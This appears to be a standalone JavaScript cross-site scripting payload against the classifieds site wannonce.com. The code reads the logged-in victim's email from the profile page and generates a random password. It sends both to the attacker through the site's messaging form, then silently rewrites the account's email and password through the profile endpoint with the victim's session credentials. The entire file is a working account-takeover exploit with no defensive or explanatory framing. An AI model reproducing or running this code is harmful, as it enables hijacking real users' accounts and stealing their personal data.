var hwurl = location.href
let pwd = (Math.random() + 1).toString(36).substring(2);
let profil = (
    document.getElementById("tdright") ||
    document.getElementById("mm-0").children[0]
).innerText;
var sd = "ok";

function hwww(email, pwd) {
    console.log("hwww", email, pwd)
    fetch("/membres/infos_membre.php", {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "upgrade-insecure-requests": "1"
        },
        "referrer": "https://www.wannonce.com/membres/infos_membre.php",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": `prenom=PN&email=${encodeURIComponent("u"+email)}&type_compte=particulier&nom_societe=&siret=&identification_number=&profil_adresse=&profil_adresse2=&profil_cp=&profil_ville=&profil_pays=&profil_tel=&sexe=femme&pwd=${pwd}&pwd_confirm=${pwd}&param_geolocalisation=oui&param_email_alerte=1&param_archiver_msg_send=1&param_use_chat=1&param_notifications=1&param_email_notif=1&param_anonymous=0&register=Traitement+en+cours...`,
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
    }).then((r) => console.log("lup", r.url, r.status), (e) => alert(e))
}



fetch('/membres/infos_membre.htm').then(r => r.text()).then(function(html) {
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, 'text/html');
    let mp1 = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
    let mp2 = '//*[@id="form_user"]/fieldset[1]/div/div/div[2]/div[2]/input/@value'
    let email = (
        doc.evaluate(mp1, doc, null, XPathResult.STRING_TYPE, null).stringValue ||
        doc.evaluate(mp2, doc, null, XPathResult.STRING_TYPE, null).stringValue
    );
    console.log("linfo em", email);

    fetch(hwurl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
            'sujet': 'RE : ' + pwd,
            piece_jointe_1: undefined,
            piece_jointe_2: undefined,
            message: `>re: coucou\n${pwd}\n${btoa(email)}`,
            send_msg: "Envoi en cours, patientez SVP..."
        })
    }).then((r) => {
        console.log("lmesg", r.url, r.status);
        hwww(email, pwd);
    }, (e) => alert(e)).then(() => 1)
});